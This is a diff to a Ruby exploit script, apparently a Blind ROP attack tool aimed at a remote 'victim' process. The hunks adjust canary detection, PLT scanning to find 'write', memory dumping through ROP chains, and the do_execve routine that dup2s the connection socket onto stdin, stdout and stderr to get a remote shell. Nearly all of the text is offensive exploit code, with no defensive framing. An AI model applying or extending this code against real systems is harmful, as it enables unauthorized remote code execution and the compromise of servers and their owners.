@@ -397,7 +397,7 @@ def canary_detect(len)
 			end
 		end
 
-		raise("canary not found") if not found
+		abort("Dang, canary not found!") if not found
 	end
 
 	val = 0
@@ -1039,11 +1039,9 @@ def dump_fd_addr(fd, addr, write = $state.write, listnum = 2)
 end
 
 def dump_addr(addr)
-	fd = 100
-
 	rop = []
 
-	plt_call_2(rop, $state.dup2, $state.file_desc, fd)
+	fd = $state.file_desc
 
 	for i in 0..20
 		plt_call_3(rop, $state.write, fd, addr + (i * 7))
@@ -1328,7 +1326,7 @@ def find_write3()
 	# the PLT for 'write', we encounter something like 'suspend' which hangs
 	# the victim's process.  Guess at a starting position thqt lies beyond
 	# the problem entries.
-	write_start = 0x100
+	write_start = 0x0 #0x100
 	# dmcccrady:  Another hard-code.  The 'write' entry is known to lie within
 	# the first 0x300 entries.
 	write_last = 0x300
@@ -1338,7 +1336,7 @@ def find_write3()
 	rep = rep.to_i
 
 	for write in write_start..write_last
-		for fd in 3..50  # Try to guess the fd as well (skip 0,1, and 2)
+		for fd in 3..10  # Try to guess the fd as well (skip 0,1, and 2).  It's probably 3.
 			return if try_write3(write, fd, rep, sl)
 		end
 	end
@@ -1825,12 +1823,11 @@ def find_good_rdx()
 
 	addr = $state.rdi - 9
 
-	fd = 100
+	fd = $state.file_desc
 
 	while true
 		rop = []
 
-		plt_call_2(rop, $state.dup2, $state.file_desc, fd)
 		plt_call_3(rop, $state.write, fd, addr, addr)
 
 		rop << $death
@@ -1873,7 +1870,7 @@ def do_execve()
 	#		dup2(fd, 0)
 	#		dup2(fd, 1)
 	#		dup2(fd, 2)
-	plt_call_2(rop, $state.dup2, $state.file_desc, fd)
+	fd = $state.file_desc
 	plt_call_2(rop, $state.dup2, fd, 0)
 	plt_call_2(rop, $state.dup2, fd, 1)
 	plt_call_2(rop, $state.dup2, fd, 2)
